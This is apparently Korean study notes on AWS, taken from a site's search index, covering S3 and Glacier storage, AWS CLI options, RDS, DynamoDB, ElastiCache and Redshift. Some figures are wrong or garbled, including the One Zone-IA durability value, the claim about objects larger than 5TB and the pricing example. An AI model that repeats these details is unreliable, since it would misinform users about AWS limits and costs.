플랫폼 자체의 암호화를 의미하며, 데이터 객체를 암호화해서 적합한 인증으로 복호화하는 작업이 AWS에서 이루어진다. Amazon S3가 관리하는 암호화 키(SSE-S3)를 사용하면 AWS가 자체 엔터프라이즈 표준 키를 사용해 암호화 복호화 프로세스의 모든 단계를 관리한다. AWS KMS-관리형 키를 사용하는 서버 측 암호화(SSE-KMS)를 사용하면 SSE-S3가 제공하는 기능에 더해 완벽한 키 사용 추적과 봉투 키를 사용할 수 있다. 고객 제공 암호화 키에 의한 서버측 암호화(SSE-C)는 고객이 S3에 제공한 자체 키로 객체를 암호화 한다.      클라이언트 측 암호화  S3로 데이터를 전송하기 전에 암호화하는 것으로, AWS KMS-관리현 고객 마스터 키(KMS-CMK)를 사용하며, 업로드 전에 고유 키로 객체를 암호화한다. 복잡한 암호화 절차를 단순화하기 때문에 서버 측 암호화를 많이 사용하지만, 회사 내에서 암호화 키의 모든 권한을 가지고 있어야 하는 경우도 있을 때 주로 사용된다.      로깅   S3 이벤트 추적을 로그 파일에 저장하는 기능은 처음에는 비활성화 되어있다.\n  S3 버킷에서 일어나는 많은 활동을 로그 데이터로 만들어 기록할 필요 없기 때문이며, 로그파일을 기록하는 것을 이를 로깅이라한다.\n  로깅을 활성화 할 때는 원본 버컷과 대상 버킷을 지정해야 하며, 하나의 대상 버킷에 여러 원본 버킷 로그를 저장했을 때 쉽게 시벽할 수 있도록 구분 기호와 접두사를 사용한다.\n  S3는 CloudWatch나 CloudTrail와 같은 AWS 서비스 및 다른 서버들의 로그저장하는 데에도 사용된다.\n  S3 생성 로그는 구성화면, 잠시 후 다음과 같은 작업 상세 항목이 기본으로 나타난다.\n 요청자 게정과 IP 주소 원본 버킷 이름 요청 동작(GET, PUT) 요청 개시 시간 응답 상태 ( 오류 코드 포함 )         S3 내구성과 가용성   객체를 저장할 때 여러 S3 스토리지 클래스 중에서 선택할 수 있으며, 내구성, 가용성, 지출가능 비용에 따라 선택한다. 관련용어 설명     키워드 설명     내구성 데이터가 손실되지 않을 확률   가용성 객체가 사용 가능한 기간   지출가능 비용 사용시 지불해야하는 가격        내구성   내구성은 백분율로 측정되며, Amazon Glacier의 경우 99.999999999% 내구성을 보장하는 데 이는, 10.000.000개의 객체를 저장하면 1만 년 동안 객체가1개 손실될 확률을 의미한다.\n  즉 S3 Standard/Glacier 플랫폼에 저장한 데이터를 인프라 장애로 손실할 가능성은 거의 없다고 볼 수 있다.\n  S3는 최소 3개의 가용 영역에 데이터를 자동으로 복제하기 때문에, 높은 내구성을 보장할 수 있다.\n  하지만 복원력이 없는 두 클래스도 존재하는 데, Amazon S3 One Zone-IA(Infrequent Access)은 단일 가용 영역에만 저장하며, RRS(Reduced Redundancy Storage)는 다른 클래스보다 적은 영역에 복제하기 때문에 99.99% 내구성만을 보장한다.\n      S3 스토리지 안정성 보장 표준       S3 Standard S3 Standard-IA S3 One Zone-IA RRS     내구성보장 99.999999999% 99.999999999% 99.9999999999% 99.99%   내결함성을 위한 동시 복제 시설 수 2 2 1 1        가용성   객체 가용성도 백분율로 측정하며, 1년 동안 해당 객체를 요청했을 때 즉시 응답할 수 있는 기간을 백분율로 나타낸다.\n  만약 Amazon S3 Standard 클래스는 연간 99.99%의 가용성을 가지고 있는 데, 이는 1년 동안 중단 시간이 1시간 이내를 의미한다.\n        S3 스토리지 표준 가용성 보장       S3 Standard S3 Standard-IA S3 One Zone-IA RRS     가용성 보장 99.99% 99.9% 99.5% 99.99%      데이터의 최종 일관성  S3는 데이터를 여러 장소에 복제하므로, 기존 데이터가 업데이트되면 시스템에 전파하느 동안에 지연시간이 발생할 수 있다. 단 이는 객첼르 생성(PUT) 할 때에는 객체 버전이 충돌할 가능성이 없으므로, 쓰기 후 읽기 일관성이 제공된다.       객체 수명 주기    S3에서 시작하는 워크로드는 대개 백업 아카이브와 관련이 있다.\n  백업 아카이브는 주기적으로 저장되므로 이에 대한 관리가 필요한 데, S3버전 관리를 통해 해결이 가능하다\n    버전 관리  기본적으로 동일한 파일을 업로드 시키는 경우에는 덮어씌어지는 데, 이는 심각한 문제를 초래할 수 있다. S3도 이와 동일하게 작동하지만, 버킷 수준에서 버전 관리를 활성화하게 되면 이전 객첼르 보존할 수 있어, 기존 버전에 계속 엑세스 하는 것이 가능하다.      수명 주기 관리  버킷에서 수명 주기 규칙을 구성하면 지정한 기간이 경과했을 때 자동으로객체가 다른 스토리지 클래스로 옮겨진다. 예를 들면 첫 30일동안은 S3 Standard 클래스에서 보관되지만, 그 이후에는 보다 저렴한 One Zone IA으로 옮겨진다. 과거 버전을 지속저으로 유지해야하는 경우 장기 저장용 Storage 서비스 Glacier으로 365일 보관이 가능하다.       S3 객체 엑세스   S3에 데이터를 저장해서 사용하겠다고 결정했다면 중요성에 맞게 S3에 저장된 객체에 엑세스하는 방법과 업무의 보안상 필요에 맞는 요청만 엑세스하도록 제한하는 방법이 필요하다.      엑세스 제어  외부 사용자는 버킷의 객체에 엑세스가 불가능하지만, ACL (엑세스 제어 목록), S3 버킷 정책, IAM 정책을 통해서 버킷이나 객체 수준에서 접근이 가능토록 할 수 있다. 위와 같은 ACL, S3 버킷 정책, IAM은 일부 중복되어 있으며, 이는 점차 서비스가 발전해오면서 새로운 기능이 추가된 서비스가 생성되었기 때문이다. 현재는 ACL대신 S3 버킷 정책이나 IAM을 사용하길 권장하고 있다. S3 버킷 정책 (JSON 형식으로 S3 버킷에 연결)은 외부 계정과 사용자가 S3 버킷에 엑세스하는 것을 제어할 수 있는 반면, IAM 정책은 IAM이 관리하느 계정, 즉 사용자와 역할이 S3를 비롯한 여러 리소스에 엑세스하는 방식을 제어하고자 할 때 사용된다.        미리 서명된 URL  외부 엑세스가 제한된 프라이빗 객체에 임시로 엑세스할 수 있게 할 때, 미리 서명된 URL을 사용할 수 있다. 미리 서명된 URL은 시간 제한이 존재하며, 기간이 지나면 사용이 불가능해지며 프로그래밍 방식으로 객체에 엑세스가 가능하다.    $ aws s3 presign s3://[ MybucketName ] /[ FilePath ] --expires-in [ second ] # second 만큼의 초 시간의 특정 File의 엑세스를 허용하는 CLI 명령어    정적 웹 사이트 호스팅   S3 버킷은 정적 웹 사이트 HTML 파일 호스팅에도 사용 정적 웹 사이트는 웹 페이지와 스크립트를 랜더링할 때 서버가 아닌 클라이언트 시스템 서비스를 사용  $ aws s3api put-bucket-acl --bucket [ MybucketName ] --acl Public-read # 버킷의 호스팅 설정을 추가하는 CLI 명령어 $ aws s3 website s3://[ MybucketName ] --index-document index.html --error-document error.html $ 버킷의 정적 웹 사이트를 호스팅하며 메인 페이지와 에러 페이지를 설정한다. ( 수정 가능 )     S3 Select와 Glacier Select  AWS는 S3나 Glacier에 저장한 데이터에 엑세스할 수 있는 또 다른 방법을 제공하는 데, 이를 Select이라 한다. 이를 사용하면 SQL와 유사한 쿼리로 저장된 객체에서 관련 데이터만 검색하는 것이 가능ㅎ다ㅏ.       Amazon Glacier   Glcanier는 S3 스토리지 클래스의 일부로 Glacier는 대부분 S3 클래스와 마찬가지로 99.999999999% 내구성을 보장하고, S3 구셩 주기에 통합할 수 있다. 단 S3와 다른 점은 S3는 단일 객체 최대 크기가 5TB인 반면, Glacier은 40TB까지의 대형 아카이브를 지원하고, S3에서는 암호화를 선택해야하지만, Glacier는 인간이 읽을 수 없는 ID가 주어진다. Glacier의 단점은 데이터를 가져오는 데 걸리는 시간으로 S3는 즉시 엑세스가 가능하지만, Glacier 아카이브에서 객체를 가져오려면 몇 시간이 걸릴 수도 있다. 이와 같이 Glacier의 목적은 데이터의 필요성과 사용빈도가 낮은 한경에서 장기적으로 데이터를 보관할 수 있는 저렴한 스토리지로 사용할 수 있다는 것이다.     스토리지 요금   스토리지 요금은 버전 관리와 객체 수명주기로 계속해서 파일이 이동하므로 과정이 복잡하다 할 수 있다. 서울 리전 스토리지 요금 예시     클래스 스토리지 용량 요금/GB/월 비용/ 월     Standard 20G $0.018 $0.36   Standard 65G $0.0144 $0.938   Standard 520G $0.005 $2.6   합계     $3.398     이 외에도 트래픽 관련 요금이 부과되며 기타 모든 요금에 대한 정보는 여기에서 확인할 수 있다. AWS 월 사용량 계산기     기타 스토리지 관련 서비스   AWS에는 S3, Glacier 이외에도 다양한 Storage Service 있다.    Amazon Elastic File System ( EFS )  EFS자동 확장 가능한 공유 파일 스토리지 서비스. 동일 VPC 내의 Network File System ( NFS )으로 여러 EC2 인스턴스에 장착한다. AWS Direct Connect 연결로 온프레미스 서버에서 엑세스할 수 있도록 설계되어 있다.        AWS Storage Gateway  온 프레미스의 로컬 백업과 아카이브 운영 요구 사항을 클라우드 스토리지 서비스를 사용해 해결하려면 복잡하진다. AWS Storage Gateway는 소프트웨어 형식의 게이트웨이로 VMware, EC2 ,Hyper-V 와 등에 사용하면 보다 쉽게 S3, EBS로 데이터의 이전이 가능하다.        AWS Snowball  대용량 데이터 세트를 일반 인터넷 연결로 클라우드에 마이그레이션하려면 많은 시간과 대역폭이 필요로 한다. 테라 혹은 페타바이트 크기의 데이터를 옮길 때문 AWS에서 256비트로 암호화한 물리적 장치인 Snowball을 사용자에게 배송하며, 이를 AWS다시 수거해 S3에 올려준다.       요약    Amazon S3는 적은 유지 관리 노력으로 대용량 아키이브와 데이터 스토리지를 운영할 수 있도록 안정성과 고가용성을 갖춘 객체 스토리지를 제공한다.\n  객체는 게층화 돼 있지 않은 버킷에 저장되어 있지만, 접두사를 사용해서 일반 파일 시스템에 있는 것처럼 보일 수 있다.\n  AWS가 제공하는 암호화 키 또는 자체 암호화 키를 사용해 S3 자체 데이터를 암호화 할 수 있으며, 대개 필수로 데이터를 암호화한다.\n  암호화의 종류로는 서버 측 암호화, 클라이언트 측 암호화로 저장 중 암호화가 이루어진다.\n  S3는 데이터 복제 정도가 다른 여러 스토리지 클래스를 제공해서 사용자가 내구성, 가용성, 비용을 고려해서 선택할 수 있게 한다.\n  기존 ACL, S3 버킷 정책, IAM을 통해 보안 주체, 대상, 시간을 제어할 수 있다. 일시적으로 제한된 데이터 엑세스를 제공하는 안전한 방법으로는 미리 서명된 URL을 사용한다.\n  SQL과 유사한 S3 Select와 Glacier Select를 사용하면 데이터 요청 크기와 비용을 줄일 수 있으며, S3 버킷에 저렴하고 간단한 정적 웹 사이트를 만들 수도 있다.\n  Amazon Claier은 데이터 아카이브를 볼트에 저장하고 가져올 때는 몇 시간이 걸리지만, S3 스토리지 클래스보다 비용이 저렴하다.\n     시험 핵심   S3 리소스 구성되는 방식을 이해한다.  S3 객체는 버킷에 저장되는 데, 버킷 이름은 글로벌하게 고유해야 하며, 버킷은 Region과 연결된다. 객체는 구조화되지 않은 버킷에 저장되지만 접두사와 기호를 사용해서 데이터에 폴더 게층 구조를 나타낼 수 있다.      데이터 전송을 최적화하는 방법을 이해한다.  S3 버킷에 저정하는 개별 객체의 크기는 5TB이며, 100MB보다 큰 객체는 멀티 파트 업로드를 사용해야 한다. 5TB보다 큰 객체는 멀티 파트 업로드 이외의 다른 업로드 방법이 없다.      S3 데이터 보안 방법을 이해한다.  AWS에서 생성한 키 또는 비공개 키로 서버 측 암호화를 사용하면 S3 버킷 내에서 데이터를 보호할 수 있다. 클라이언트 측 암호화를 사용해 S3 전송되기 전에도 데이터를 암호화 할 수 있다.      S3 객체의 내구성과 가용성을 측정하는 방법을 이해한다.  다양한 S3 클래스와 Glacier는 여러 수준에서 인프라 안정성과 데이터 가용성을 약속한다.      S3 객체 버전 관리와 수명 주기 관리를 이해한다.  객체를 덮어 쓴 뒤에도 덮어쓰기 전 객체를 보존해서 액세스 할 수 있다. 지연 시간이 짧은 스토리지 클래스에 지연 시간이 긴 클래스로 자동 전환하는 방법은 오래된 객체를 관리할 수 있고, 최종적으로 삭제 예약 또한 가능하다.      S3 객체를 보호하는 방법을 이해한다.  기존 버킷과 객체 기반 ACL 규칙으로 엑세스를 제어할 수 있고, 더욱 유연한 S3 버킷 정책이나 곚어 수준 IAM 정책으로 엑세스를 제어할 수 있다. 미리 서명된 URL를 통해 임시로 엑세스를 허용할 수 있다.      정적 웹 사이트를 만드는 방법을 이해한다.  S3에 HTML, 미디어 파일을 저장하고 Route 53과 CloudFront를 사용해서 DNS 도메인 이름으로 액세스 할 수 있는 암호화된 HTTPS 페이지 웹사이트로 제공할 수 있다.      S3와 Glacier의 차이를 이해한다.  Glacier는 자주 요청되지 않으리라고 예상하는 데이터 아카이브를 위한 저렴한 장기 보존 스토리지이다.    "}),a.add({id:69,href:'/docs/aws/awstraining/cli/',title:"AWS CLI 활용",content:"AWS CLI 활용    AWS CLI 활용    이번 시간에는 AWS CLI을 활용하는 방법에 대해 알아보도록 하겠습니다. AWS CLI의 대한 개념과 설치는 AWS CLI를 참고해주세요.     AWS CLI 기본설정   먼저 여기서는 Window 10, Powershell에서 진행하도록 하겠습니다. Linux나 Mac 등 타 OS도 AWS CLI가 설치되어 있으면 모두 동일하니 똑같이 진행하셔도 문제없습니다.      먼저 프롬프트 혹은 터미널을 실행 후, aws configure을 입력합니다. 그러면 엑세스 키와 시크릿 키, 리전 그리고 파일형식을 입력하는 값이 나오는 데, 만약 전 시간에서 사용자 계정을 만들면서 학습했던 프로그래밍 엑세스 방식이 생각나신다면, 한결 수월하게 해결하실 수 있습니다. 혹시 모르시거나 깜박하신 분들은 AWS IAM, AWS 사용자 계정 생성을 참고해주세요.   $ aws configure # aws 인증 값 등록 AWS Access Key ID [ AcceseeKeyId ]: ********* # 계정의 AccessKeyId를 입력 AWS Secret Access Key [ SecretAccessKey ]: ******** # 계정의 SecretAccesskey를 입력 Default region name [ Region ]: ap-northeast-2 # 리전의 이름을 입력 Default output format [ File format ]: json # 파일의 포맷 형식을 입력 $ aws ec2 describe-security-groups # 확인 ( 차후에 명령어에 대해 설명드리겠습니다. )    AWS CLI 사용방법    그럼 이제 본격적인 CLI 사용방법에 대해 알아보도록 하겠습니다.   profile을 설정   위에서 configure을 통해 aws CLI을 사용하기 위한 인증을 마쳤습니다. 하지만 만약 인증을 마친 유저에 대한 권한이 다르다면, 또 다른 계정을 사용해야 한다면 어떻게 해야할까요? 이를 위해 AWS CLI에서는 \u0026ndash;profile 명령어를 통해 별도이 설정파일로 저장할 수 있습니다.   $ aws configure --profile [ User ] AWS Access Key ID ... : *** ... Default output format ... : *** # 개별 설정파일 등록 $ aws [ 명령어 ] --profile [ User ] $ [ User ]의 권한으로 명령어를 실행  위의 명령어를 통해 [ User ]의 profile을 지정 후 저장 후, \u0026ndash;profile [ User ] 옵션을 통해 사용합니다. 등록한 모든 설정파일은 보통 사용자계정 폴더 내부의 .aws에 생성됩니다.     AWS CLI 기본적인 명령어 형태   AWS CLI의 기본적인 명령어 형태는 다음과 같습니다.  $ aws [ 서비스 이름 ] [ 리소스 조작 명령어 ] ------------------------------------------------------------------------------------------------- 옵션 | 처리 ------------------------------------------------------------------------------------------------- --profile | 설정한 profile로 명령어를 실행합니다. --region | 리전을 지정합니다. --output | 출력 형식을 지정합니다. --filters | 참조 계열 명령어를 사용할 때, 검색 조건을 지정해서 필터링 합니다. --query | 실행 결과 내용을 압축해서 출력합니다.    Region과 output 옵션을 사용한 검색 조건 지정 $ aws ec2 describe-security-groups --region ap-northeast-2 --output [ json, text, table ] # ap-northeast-2 리전에서 각 형식으로 ec2 보안그룹에 대한 정보를 참조  각 형식의 차이점을 확인해보세요.     filters 옵션을 사용한 검색 조건 지정   \u0026ndash;filters 옵션을 사용하면 참조 계열 명령어를 실행할 때, 검색 조건을 지정할 수 있습니다. 지정할 수 있는 \u0026ndash;filters 옵션의 필터 이름은 서비스, 리소스에 따라 차이가 있어 AWS CLI 명령어 레퍼런스를 참고해주세요..   $ aws [ 서비스 이름 ] [ 리소스 조작 명령어 ] --filters \u0026#34;Name=[ 필터 이름 A ], Values=[ 조건A1 ]\u0026#34; \u0026#34;Name=[ 필터 이름 B ], Values=[ 조건B1 ], [ 조건B2 ]\u0026#34;  위와 같이 \u0026ndash;filters의 사용방법은 1개의 필터에 큰 따옴표(\u0026quot;)를 감싸고, \u0026ldquo;Name=\u0026ldquo;에 필터이름, \u0026ldquo;Values=\u0026ldquo;에 필터 이름에 대응하는 조건을 작성하는 것으로, 쉼표(,)를 통해 복수의 조건을 작성하는 것 또한 가능합니다.   $ aws ec2 describe-instances --filters \u0026#34;Name=private-ip-address,Values=10.0.0.10\u0026#34; # 프라이빗 ip가 10.0.0.10인 ec2를 참조 $ aws ec2 describe-instances --filters \u0026#34;Name=instance-type,Values=t2.medium, m3.medium\u0026#34; # 인스턴스의 타입이 t2.medium, m3.medium인 인스턴스를 참조 $ ec2 describe-instances --filters \u0026#34;Name=tag:Project,Values=AWS Training\u0026#34; # 태그의 값이 AWS Training인 인스턴스를 참조 $ aws ec2 describe-instances --filters \u0026#34;Name=instance-type,Values=t2.medium, m3.medium\u0026#34; \u0026#34;Name=tag:Project,Values=AWS Training\u0026#34; # 2번째 조건과 3번째 조건을 함께 사용하는 인스턴스 참조 $ aws ec2 describe-images --filters \u0026#34;Name,Values=SampleAMI2020*\u0026#34; # AMI images 중에서 이름이 SampleAMI로 시작하는 모든 인스턴스를 참조    query 옵션을 사용한 출력 결과 압축   query 옵션을 사용해서 명령어를 실행 할 때 실행 결과를 압축할 수 있습니다. filters와 마찬가지로 각 서비스에 따라 사용할 수 있는 query가 다르며 가능한 명령어들은 AWS CLI 명령어 레퍼런스를 참고해주세요.   $ aws [ 서비스 이름 ] [ 리소스 조작 명령어 ] --query \u0026#39;[ 쿼리 이름 ( 1계층 )[].쿼리 이름(2 계층)....\u0026#39;]  query는 계층 구조로 되어 있습니다. 따라서 AWS CLI 명령어 레퍼런스를 참고해서 계층 구조와 출력할 항목을 query 옵션으로 지정해야 합니다. query은 추가로 json, table 형식으로 출력할 때는 쿼리 이름이 키 ( 별칭 )을 붙여야 하며, \u0026ndash;filter와 마찬가지로 조건을 지정할 수 있습니다. ( \u0026lt;, \u0026lt;=, ==, \u0026gt;=, \u0026gt;, !=)   $ aws ec2 describe-instances --query \u0026#39;Reservations[].Instances[].InstanceId\u0026#39; # 모든 인스턴스의 인스턴스 ID를 참조 $ aws ec2 describe-instances --query \u0026#39;Reservations[].Instances[].[InstanceId,PrivateIpAddress]\u0026#39; # 모든 인스턴스의 인스턴스 ID, 프라이빗 IP를 참조하는 방법 $ aws ec2 describe-instances --query \u0026#39;Reservations[].Instances[?InstanceType=\u0026#39;t2.small\u0026#39;].[InstanceId, PrivateIpAddress] --output json # 인스턴스 유형이 t2.small인 것의 인스턴스 ID, 프라이빗 IP를 json형식으로 출력 $aws ec2 describe-instances --query \u0026#39;Reservations[]. Instances[?InstanceType==\u0026#39;t2.small\u0026#39;].{IDLInstanceID,IP:PrivateIpAddress,Name:Tags[?Key==\u0026#39;Name\u0026#39;].Value}\u0026#39; --output json # 인스턴스 유형이 t2.small인 것의 인스턴스 ID, 프라이빗 ID에 ID, IP라는 키를 붙여 JSON 형식으로 출력하는 방법   지금까지 기본적인 AWS CLI에 명령어에 대해 알아보았습니다. 하지만 아직, 인스턴스나 VPC, 각종 서비스에 대해 공부를 하지 않아 아직까지는 간단하게 어떻게 작동되는 지, 어떠한 형식을 가지고 있는 지만 익혀두시면 충분합니다.  "}),a.add({id:70,href:'/docs/aws/amazonwebservice/aws_database/',title:"AWS Database",content:"AWS DataBase   Amazon RDS ( Relational Database Service )  분산 관계형 데이터베이스 MariaDB, MySQL, PostgreSQL, Oracle 등을 AWS에서 제공해주는 것 애플리케이션 내에서 관계형 데이터베이스의 설정, 운영, 스케일링을 단순케 하도록 설계된 클라우드 내에서 동작하는 웹 서비스 데이터베이스 소프트웨어 패치하거나 데이터베이스를 백업하거나 시점 복구를 활성화하는 것과 같은 복잡한 관리 프로세스들은 자동으로 관리 스토리지와 연산 자원들을 스케일링 하는 것은 하나의 API 호출로 수행이 가능 관계형 데이터베이스를 AWS 상에서 사용할 수 있도록 지원하는 서비스 생성 후 서비스를 이용하기만 되므로 SaaS에 해당 MySQL, MariaDB, Postgre SQL, Oracle, MS SQL, Aurora 사용 가능 DB 인스턴스에 대한 shell 지원 불가 및 OS 제어 불가능 ( AWS 관리 ) 백업, 소프트웨어 패치, 장애 감지 및 복구를 AWS가 관리 Storage 용량에 대하여 Auto Scaling MariaDB, MySQL, Aurora는 서로 호환이 가능    DB Instance  RDS의 기본 구성요소로서 클라우드에서 실행하는 격리된 데이터베이스 환경을 의미, 인스턴스 내에서는 여러 사용자가 만든 데이터베이스가 포함되며 엑세스할 여러 도구와 앱 사용 가능 DB 인스턴스도 EC2처럼 다양한 클래스를 가지고 있음 ( db.m5, db.r5 등 ) RDS도 클라우드에서 실행되기 때문에 하나의 AZ에서 격리되어 인스턴스로서 실행   DB Instance Storage  데이터베이스의 유지를 위패 EBS를 사용하며 필요한 스토리지 용량에 맞춰 자동으로 데이터를 여러 EBS 볼륨에 나누어 저장 스토리지의 유형 범용 SSD: 대부분의 워크로드에서 사용하는 기본적인 스토리지 프로비져닝 IOPS: 빠르고 일관적인 I/O 성능이 필요하고 일관적으로 낮은 지연시간이 요구될 경우 사용하는 스토리지 ( I/O input/ Output ) 마그네틱: 접속 빈도가 적은 워크로드에 적합한 스토리지   Multi-AZ  RDS는 Multi-AZ라는 기능을 통해 고가용성을 지원 ( 다수의 AZ에 DB 인스턴스를 둠으로써 하나 혹은 그 이상의 AZ가 파괴되어 서브시가 불가능 할 때를 대비 ) 기본 인스턴스가 수행해야할 작업( 백업, 스냅샷 생성 ) 등을 대신하여 수행함으로서 기본 인스턴스의 부담을 줄임 RDS도 클라우드에서 실행되기 때문에 하나의 AZ에서 격리되어 인스턴스로서 실행 기본 인스턴스에서 스냅샷을 캡쳐한 후 다른 AZ에 복원하여 ‘동기식’ 예비 복제본을 생성 Active( AZ A )-Standby ( AZ B, C ) 구조를 형셩한 후 지속적으로 동기화 ‘ 예비 ‘ 복제본이기 때문에 읽기 및 쓰기 작업을 수행할 수 없음 Multi-AZ를 사용하는 경우, 단일 AZ 배포에 비해 쓰기 및 저장 지연 시간이 길어질 수 있음 ( 동기화 문제 )   Multi-AZ  Multi-AZ를 활성화한 상태에서 DB 인스턴스에 문제가 발생하면 자동으로 다른 AZ의 예비 복제본 ( Standby )로 전환하며 서비스를 이어나감 전환에 사용되는 시간은 60- 120초 전환되는 상황 가용 영역( AZ ) 중단 기본 DB 인스턴스 오류 DB 인스턴스 서버 유형 변경 기본 DB 인스턴스 OS에서 소프트웨어 패치 실시 장애 조치 재부팅( Failover ) 실시  DB Instance Storage  데이터베이스의 유지를 위패 EBS를 사용하며 필요한 스토리지 용량에 맞춰 자동으로 데이터를 여러 EBS 볼륨에 나누어 저장  Read Replica  읽기 전용의 복제본, 기본 DB 인스턴스가 읽기와 쓰기를 담당한다면 Read Replica는 읽기 작업만을 담당하여 마스터 DB 인스턴스의 부하를 줄임 우선 DB 마그네틱: 접속 빈도가 적은 워크로드에 적합한 스토리지   Automated Backup  RDS의 자동백업으로 개별 데이터베이스를 백업하는 것이 아닌 DB 인스턴스 전체를 백업하는 것 매일매일 백업이 이루어지며, 기본 보존기간은 CLI로 생성시 1일\u0026amp; 콘솔로 생성시 7일이며 최저 1일부터 35일 까지 가능 특정시점을 지정하여 복원가능하며 복원 기간내로부터 최근 5분까지 특정시점을 지정하여 복원 가능 사용자가 백업시간에 자동적으로 백업되며, 백업 중에는 스토리지 I/O가 일시적으로 중단될 수 있음 ( Multi-AZ 사용시 Standby에서 백업 실시 ) 전환되는 상황 가용 영역( AZ ) 중단 기본 DB 인스턴스 오류 DB 인스턴스 서버 유형 변경 기본 DB 인스턴스 OS에서 소프트웨어 패치 실시 장애 조치 재부팅( Failover ) 실시   Enhanced Monitoring  RDS의 지표를 실시간으로 모니터링하는 ‘ 강화된＇ 모니터링 모니터링 지표는 CloudWatchs Logs에 30일간 저장됨 일반 모니터링과의 차이점은 Enhanced Monitoring은 인스턴스 내 에이전트를 통해 지표를 수집하는 반면, 일반 모니터링은 하이퍼바이저에서 수집 ( 최대 1초 단위 )   RDS vs DB in EC2  EC2 위에 데이터베이스를 직접 올리는 만큼 설정을 마음대로 변경할 수 있고, 커스터마이징 또한 가능 RDS와는 반대로 백업과 패치 등 관리를 직접해야 함 EC2에 설치하는 것이기에 SSH 접속 가능    Amazon DynamoDB  종합 관리형 NoSQL 데이터베이스 서비스로, 원할환 확장성과 예측 가능한 성능을 제공 데이터 규모에 관계없이 데이터를 저장 및 검색하고, 어떤 수준의 요청 트래픽이라도 처리할 수 있는 데이터베이스 테이블의 생성이 가능 배포가 단순하고 신속, 설계를 해서 데이터베이스의 적용까지 많은 시간이 소요되지 않음 확장이 단순하고 신속, 단순한 인터페이스의 유리 온 디맨드 백업기능 제공   DynamoDB의 특징  배포가 단순하고 신속 확장이 단순하고 신속, 수백만 IOPS 데이터는 자동으로 복제되어 있음 빠르고 일관된 응답시간, SSD, 10밀리초 미만 보조 인덱스를 통한 빠른 조회 사용한만큼 지불, 저장소 및 프로비저닝된 처리용량    Amazon ElastiCache   Cache  Cache는 CPU 칩 안에 들어가 있는 작은 메모리 ( 물리적 실체 ) 프로세서가 필요한 데이터가 있을 때마다 메인 메모리에 일일이 접근하여 속도가 지연되는 것을 막기 위해 자주 사용하는 데이터를 담아두는 곳 즉 처리 속도 향상을 위해 존재하는 작은 칩이자 메모리 L1,L2,L3로 나뉘며 숫자가 적을 수록 도달하는 속도가 빠름 Cache는 CPU와 메모리 사이 뿐만 아니라, 메모리와 디스크 사이에서도 발생함 후술할 In Memory Cache는 메모리와 디스크 사이의 Caching을 의미   In Memory Cache ( In Memory DataBase )  데이터 처리 속도를 향상시키기 위한 메모리 기반의 DBMS 메모리 위에 모든 데이터를 올려두고 사용하는 데이터베이스의 일종( ElastiCache가 AWS 카테고리에서 DB 부분에 있는 이유 ) 디스크에 최적화된 Database ( RDS 등 ) 에서 저장된 쿼리 결과나 자주 사용하는 데이터를 메모리에 적재하여 사용하는 것은 비효율적 즉 모든 데이터를 메모리 위에 올려두어 굳이 디스크 기반의 데이터베이스에까지 이동하여 데이터를 가져와 속도가 저하되는 것을 막음 데이터베이스의 데이터뿐만 아니라, 디스크, 세션, 기타 동적으로 생성된 데이터를 저장할 수 있음 메모리 기반의 데이터베이스이기 때문에, 휘발성 메모리라는 단점이 존재하며 전원 공급 차단시 모든 데이터가 유실되고 할당된 메모리에 한해 저장 가능   ElastiCache  AWS의 In Memory Cache Service Memcached와 Redis로 나뉨 Memached, Redis 모두 비관계데이터베이스형(NosQL) 서비스이며, Key-value 기반임 Memached, Redis 모두 이미 존재하는 서비스이며 AWS에서 사용가능하도록 구현한 것 ElastiCache는 Node로 구성되어 서비스를 제공하며, Node는 EC2처럼 다양한 Type을 가지고 유형에 따라 다양한 메모리 크기를 가짐 다양한 Type을 갖는 이유는 적은 양의 메모리가 필요할 경우, 작은 Type의 Node를 사용하여 비용을 적게 들게 하기 위함 유형이 결정된 Node들은 ‘고정된’ 메모리 크기를 가지며, 각자의 DNS로 이루어진 엔드포인트를 보유함   Memcache  Cluster로 구성되어 있으며, Cluster 내에는 Node들이 존재하여 인 메모리 캐시로서의 역할을 담당함 각 Node는 Type별로 메모리를 보유하며 서비스를 제공하며, 필요시 Node를 늘려 서비스 용량을 향상시킬 수 있음 각 Node별로 AZ를 따로 둘 수 있지만, 장애 조치(Failover)가 불가능하고 복제본을 둘 수 없음 Redis의 특징 기본적으로 Cluster로 구성되지는 않지만, Cluster로 구성이 가능하며 Shard와 Node를 가지고 있음 Shard는 여러 Node로 구성되며, 하나의 Node가 읽기/쓰기를 담당하고 나머지 Node는 복제본 역할을 함 Cluster로 구성되지 않은 Redis는 하나의 Shard만을 가지지만, Cluster로 구성될 경우 다수의 Shard를 갖게 됨 복제본을 가지므로, 장애조치(복제본을 기본 Node로 승격)가 가능하며 Multi-AZ 기능을 지원함    Amazon Redshift   Redshift  PostgreSQL를 기반으로 하는 AWS의 Data Warehouse Service 모든 데이터를 표준 SQL 혹은 BI 도구를 사용하여 효율적으로 분석할 수 있도록 지원 대량 병렬처리(MPP)를 통해 복잡한 쿼리라도 빠른 속도로 실행하여 대용량 처리 가능 열(Column) 단위 데이터 저장방식 COPY 명령어를 통해 Amazon EMR, Amazon DynamoDB, S3로부터 데이터를 병렬 로드 가능 Enhanced VPC Routing을 통해 클러스터와 VPC 외부의 COPY, UNLOAD 트래픽을 모니터링할 수 있음 WLM(Workload Management)를 통해 사용자가 작업 부하 내 우선 순위를 유연하게 관리하도록 지원 보존기간이 1일인 자동 백업을 지원하며, 최대 35일까지 설정 가능 단일 AZ 배포만을 지원함   Redshift의 구성  클러스터 : Redshift의 핵심 요소로, 하나의 리더 노드와 다수의 컴퓨팅 노드를 가지고 있는 구성 요소 리더 노드 : 클라이언트 프로그램과 일어나는 통신을 비롯해 컴퓨팅 노드간의 모든 통신/작업 관리 컴퓨팅 노드 : 실제 작업을 수행하는 노드로, 각 노드마다 전용 CPU와 메모리 내장 디스크 스토리지를 따로 보유함   Data Warehouse(DW)  하나의 통합된 데이터 저장공간으로서, 다양한 운영 환경의 시스템들로부터 데이터를 추출, 변환, 통합해서 요약한 데이터베이스 데이터베이스가 관련 있는 업무 데이터는 잘 저장하나, 저장된 데이터들을 제대로 활용하지 못 하는 것에서 착안 기본적으로 관계형 데이터베이스가 있는 상태를 가정하여 DW를 구성하며, 동영상이나 음악처럼 DB에 저장할 수 없는 파일도 필요한 부분을 추출하여 보여주어야 함   ETL(Extract, Tranform, Load)  데이터를 추출하고, 변형하여, (Data Warehouse에) 적재하는 과정을 일컫는 말   BI(Business Intelligence)  데이터 추출/통합/리포팅을 위한 기본도구 집합, DW에서 분석된 데이터를 통해 숨겨진 패턴을 찾아냄 == \u0026gt; 